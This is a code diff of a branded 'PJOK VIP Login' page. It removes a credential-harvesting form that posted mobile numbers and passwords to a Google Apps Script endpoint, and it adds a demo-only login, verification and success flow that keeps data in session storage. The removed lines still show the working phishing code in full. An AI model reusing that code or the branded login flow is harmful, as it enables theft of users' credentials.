@@ -4,74 +4,133 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PJOK VIP Login</title>
-
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 
 <div class="container">
-<div class="login-box">
+    <div class="card">
 
-<div class="logo">
-    <img src="https://images.23924894.com/wsd-images-prod/pjokbdtf6/fe_setting/web_logo/wps_logo_20250620214714.png">
-    <h2>VIP LOGIN</h2>
-</div>
+        <div class="logo">
+            <h1>PJOK</h1>
+            <h2>VIP LOGIN</h2>
+        </div>
 
-<form id="loginForm">
-    <div class="input-box">
-        <i class="fa-solid fa-phone"></i>
-        <input type="text" name="mobile" placeholder="Mobile Number" required>
+        <form id="loginForm">
+
+            <div class="input-box">
+                <span>📱</span>
+                <input
+                    type="tel"
+                    id="mobile"
+                    placeholder="Mobile Number"
+                    required
+                >
+            </div>
+
+            <button type="submit" class="main-btn">
+                LOGIN
+            </button>
+
+        </form>
+
+        <p class="demo-text">Demo website — no information is stored.</p>
+
     </div>
-
-    <div class="input-box">
-        <i class="fa-solid fa-lock"></i>
-        <input type="password" name="password" placeholder="Password" required>
-        <span class="eye"><i class="fa-solid fa-eye"></i></span>
-    </div>
-
-    <div class="remember">
-        <label><input type="checkbox"> Remember Me</label>
-        <a href="#">Forgot Password?</a>
-    </div>
-
-    <button type="submit" class="login-btn">LOGIN</button>
-
-    <div class="divider"><span>OR</span></div>
-
-    <button type="button" class="google-btn">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg">
-        Continue with Google
-    </button>
-
-    <p class="register">
-        Don't have an account? <a href="#">Register Now</a>
-    </p>
-</form>
-
-</div>
 </div>
 
 <script>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
+document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
-    
-    const formData = new FormData(this);
-    
-    fetch('https://script.google.com/macros/s/AKfycbxn0Fkb8teONKL3736xc-yjLDpZ-k6jSBXdVSUxWT2Dgv4McZ-6rU_8O49DT7APVWaZmQ/exec', {
-        method: 'POST',
-        body: formData
-    })
-    .then(() => {
-        alert("✅ Submitted Successfully!");
-        this.reset();
-    })
-    .catch(() => {
-        alert("❌ Something went wrong!");
-    });
+
+    const mobile = document.getElementById("mobile").value.trim();
+
+    if (mobile === "") {
+        alert("Please enter your mobile number.");
+        return;
+    }
+
+    // Demo only — number is not sent anywhere
+    sessionStorage.setItem("demoMobile", mobile);
+
+    window.location.href = "verify.html";
 });
 </script>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+
+        <div class="verify-icon">✓</div>
+
+        <h2>Verification</h2>
+
+        <p class="description">
+            Your number has been received for this demo.
+            Click verify to continue.
+        </p>
+
+        <div class="demo-box">
+            <strong>Demo Verification</strong>
+            <br>
+            No OTP or password is required.
+        </div>
+
+        <button class="main-btn" onclick="verifyDemo()">
+            VERIFY
+        </button>
+
+    </div>
+</div>
+
+<script>
+function verifyDemo() {
+    window.location.href = "success.html";
+}
+</script>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Success</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="container">
+    <div class="card success-card">
+
+        <div class="success-icon">✓</div>
+
+        <h2>Success!</h2>
+
+        <p class="description">
+            Your demo verification was completed successfully.
+        </p>
+
+        <button class="main-btn" onclick="location.href='index.html'">
+            BACK TO LOGIN
+        </button>
+
+    </div>
+</div>
 
 </body>
 </html>
